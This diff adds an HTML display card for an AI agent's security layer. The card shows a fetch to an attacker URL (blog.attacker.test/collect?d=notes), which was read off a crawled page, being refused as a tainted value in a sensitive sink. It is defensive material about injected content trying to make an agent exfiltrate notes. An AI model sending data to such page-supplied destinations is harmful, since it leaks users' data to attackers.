@@ -1,0 +1,61 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=IBM+Plex+Sans:wght@400;600&display=swap">
+  <style>
+    body { margin: 0; font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .row { display: flex; align-items: flex-start; }
+    .sp { white-space: pre; }
+    .sans { font-family: "IBM Plex Sans", ui-sans-serif, system-ui, sans-serif; }
+    a { color: #e0a458; } a:hover { color: #f0bd7e; }
+  </style>
+</helmet>
+<div style="background: {{bg}}; min-height: 100%; padding: 34px 36px; font-size: 13.5px; line-height: 1.65;">
+
+  <div class="row" style="gap: 18px; align-items: flex-start;">
+    <pre class="sp" style="margin: 0; color: {{signal}}; font-size: 15px; line-height: 1.3; flex: none;">┌────────┐
+│ \\  // │
+│--(OO)--│
+│ //  \\ │</pre>
+    <div style="padding-top: 4px;">
+      <div class="row"><span class="sp" style="color: {{signal}}; font-weight: 700; width: 3ch; flex: none;">&#10800;</span><span class="sp" style="color: {{signal}}; font-weight: 700; width: 11ch; flex: none;">REFUSED</span><span class="sp" style="color: {{signal}};">sink_gate</span></div>
+      <div class="row" style="margin-top: 4px;"><span class="sp" style="width: 3ch; flex: none;"> </span><span style="color: {{muted}};">layer 1 &mdash; structural, before any request left the process</span></div>
+    </div>
+  </div>
+
+  <div style="height: 1px; background: {{rule}}; margin: 26px 0 20px;"></div>
+
+  <div class="row"><span class="sp" style="color: {{chrome}}; width: 12ch; flex: none;">step</span><span style="color: {{content}};">3 &nbsp;&nbsp;fetch</span><span style="color: {{muted}};">&nbsp;&nbsp;url = <span style="color: {{muted}};">{{target}}</span></span></div>
+  <div class="row" style="margin-top: 6px;"><span class="sp" style="color: {{chrome}}; width: 12ch; flex: none;">value</span><span style="color: {{content}};">https://blog.attacker.test/collect?d=notes</span></div>
+  <div class="row" style="margin-top: 6px;"><span class="sp" style="color: {{chrome}}; width: 12ch; flex: none;">origin</span><span style="color: {{content}};">extract</span><span style="color: {{muted}};">&nbsp;&nbsp;read off the page &mdash; tainted</span></div>
+  <div class="row" style="margin-top: 6px;"><span class="sp" style="color: {{chrome}}; width: 12ch; flex: none;">contract</span><span style="color: {{content}};">default-deny</span></div>
+  <div class="row" style="margin-top: 6px;"><span class="sp" style="color: {{chrome}}; width: 12ch; flex: none;">reason</span><span style="color: {{content}};">tainted value in sensitive sink arg(s) ['url']</span></div>
+
+  <div style="height: 1px; background: {{rule}}; margin: 22px 0 18px;"></div>
+
+  <div class="sans" style="color: {{chrome}}; font-size: 14px; line-height: 1.6; max-width: 58ch;">
+    The extractor read this address off the page it had just crawled. The plan fixed every destination <em style="color: {{content}}; font-style: normal;">before</em> that page was fetched &mdash; so the value can be carried as content, but it can never become a destination.
+  </div>
+
+  <div class="row" style="margin-top: 20px;"><span class="sp" style="color: {{chrome}}; width: 12ch; flex: none;">audit</span><span style="color: {{muted}};">runs/96bfa657/audit.jsonl &nbsp;&middot;&nbsp; verdict deny</span></div>
+
+</div>
+</x-dc>
+<script data-dc-script data-props='{"ground":{"editor":"enum","options":["dark","light"],"default":"dark"}}'>
+class Component extends DCLogic {
+  renderVals() {
+    const light = (this.props.ground ?? "dark") === "light";
+    return light
+      ? { bg: "#f7f6f3", chrome: "#8b93a1", content: "#23262d", signal: "#a86a1a", muted: "#a8adb6", rule: "#ddd9d1" }
+      : { bg: "#12141a", chrome: "#5b6472", content: "#d6dae2", signal: "#e0a458", muted: "#464e5c", rule: "#242832" };
+  }
+}
+</script>
+</body>
+</html>
